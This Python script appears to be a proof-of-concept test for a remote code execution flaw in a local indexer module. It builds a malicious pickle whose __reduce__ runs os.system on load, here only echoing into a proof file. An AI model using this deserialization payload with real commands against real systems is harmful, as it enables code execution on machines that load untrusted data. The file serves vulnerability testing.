
import os
import pickle
import shutil
from vulnerable_indexer import index_folder

# A malicious class that executes a command upon deserialization
class RCE:
    def __reduce__(self):
        # This command will be executed when the object is deserialized
        command = 'echo "RCE Successful" > rce_proof.txt'
        return (os.system, (command,))

def test_indexer_vulnerability():
    """
    Tests the RCE vulnerability in the index_folder function.
    """
    print("[*] Preparing fuzz test for vulnerable_indexer.py")
    
    # Define paths
    test_dir = "temp_index_data"
    proof_file = "rce_proof.txt"
    malicious_file_path = os.path.join(test_dir, "malicious.index")

    # Clean up previous runs
    if os.path.exists(proof_file):
        os.remove(proof_file)
    if os.path.exists(test_dir):
        shutil.rmtree(test_dir)
    
    # Create a directory to be scanned
    os.makedirs(test_dir)
    print(f"[*] Created temporary directory: {test_dir}")

    # Create the malicious pickle file
    malicious_payload = RCE()
    with open(malicious_file_path, "wb") as f:
        pickle.dump(malicious_payload, f)
    print(f"[*] Created malicious index file: {malicious_file_path}")

    print("\n[*] --- Calling the vulnerable function ---")
    # Call the vulnerable function on the directory containing the malicious file
    index_folder(test_dir)
    print("[*] --- Vulnerable function finished ---\\n")

    # Check for evidence of code execution
    if os.path.exists(proof_file):
        print("[SUCCESS] RCE vulnerability confirmed! The file 'rce_proof.txt' was created.")
    else:
        print("[FAILURE] RCE vulnerability not triggered. The proof file was not created.")

    # Clean up
    print("[*] Cleaning up temporary files and directories.")
    if os.path.exists(proof_file):
        os.remove(proof_file)
    if os.path.exists(test_dir):
        shutil.rmtree(test_dir)

if __name__ == "__main__":
    test_indexer_vulnerability()
